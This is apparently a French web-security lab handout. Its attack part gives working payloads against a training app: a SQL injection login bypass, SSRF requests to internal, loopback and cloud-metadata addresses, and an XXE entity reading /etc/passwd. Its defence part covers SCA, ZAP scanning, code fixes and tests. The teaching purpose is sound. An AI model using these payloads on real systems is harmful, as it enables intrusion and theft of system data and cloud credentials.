Partie A — Comprendre & exploiter

Ces fonctions sont dans le back-office. Connectez-vous en admin (SQLi du TP3 : admin'-- -) avant d'attaquer.

A.1 — SSRF via l'import d'image

Le back-office « importe une image depuis une URL » : le serveur va chercher l'URL que vous fournissez. Rien ne l'empêche de viser le réseau interne. Le lab démarre un service interne (internal-metadata) non exposé publiquement :

GET /admin/import-image?url=http://internal-metadata:5678/
# ou, hors docker, un service local :
GET /admin/import-image?url=http://127.0.0.1:5678/
# cible classique en cloud (métadonnées) :
GET /admin/import-image?url=http://169.254.169.254/latest/meta-data/

La réponse renvoie le contenu du service interne : vous avez fait parler le serveur à sa place.

A.2 — XXE via l'import de catalogue

L'import de catalogue parse du XML avec les entités externes activées. On déclare une entité qui lit un fichier :

POST /admin/import-catalog    (Content-Type: application/xml)

<?xml version="1.0"?>
<!DOCTYPE catalog [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<catalog><product><name>&xxe;</name></product></catalog>

Le nom de produit renvoyé contient le contenu de /etc/passwd. On peut aussi viser une URL interne (XXE → SSRF).

Partie B — Détecter & corriger en CI/CD

B.1 — SCA : composition logicielle

Ajoutez .github/workflows/04-sca-dast.yml (jobs sca + dast) et .github/dependabot.yml. Le job sca fait échouer le build si une vuln high+ est présente (npm audit + OSV-Scanner). Dependabot ouvrira des PR de mise à jour automatiques.

B.2 — DAST : scan dynamique avec ZAP

Le job dast démarre l'appli (docker compose up) puis lance ZAP baseline contre http://localhost:3000. ZAP trouve dynamiquement des classes de failles (dont la SSRF réfléchie, les en-têtes manquants). Les seuils sont dans .zap/rules.tsv.

DAST = on attaque l'appli qui tourne ; SCA = on inspecte les dépendances ; SAST (TP3) = on lit le code. Trois angles, trois familles de failles. Aucun ne suffit seul.

B.3 — Corriger

  • SSRF : remplacez src/routes/admin.js par la version fournie. Elle valide le schéma (http/https), résout l'hôte et refuse toute IP privée/loopback/link-local, et ne suit pas les redirections.
  • XXE : même fichier — le XML est parsé sans substitution d'entités, sans DTD externe, sans réseau (noent:false, dtdload:false, nonet:true).
  • Dépendances : appliquez les PR Dependabot / npm audit fix au fil des TP (certaines versions ne seront bumpées qu'aux TP5/6 où on traite la faille correspondante).

B.4 — Vérifier

npm test     # tests/ssrf.test.js et tests/xxe.test.js doivent passer
  • SSRF vers 127.0.0.1 → 403 ; vers 169.254.169.254 → 403 ; file:// → 400.
  • XXE : l'entité externe n'est plus résolue (aucune fuite de /etc/passwd).
  • L'import d'image légitime (URL publique) et l'import XML légitime fonctionnent toujours.
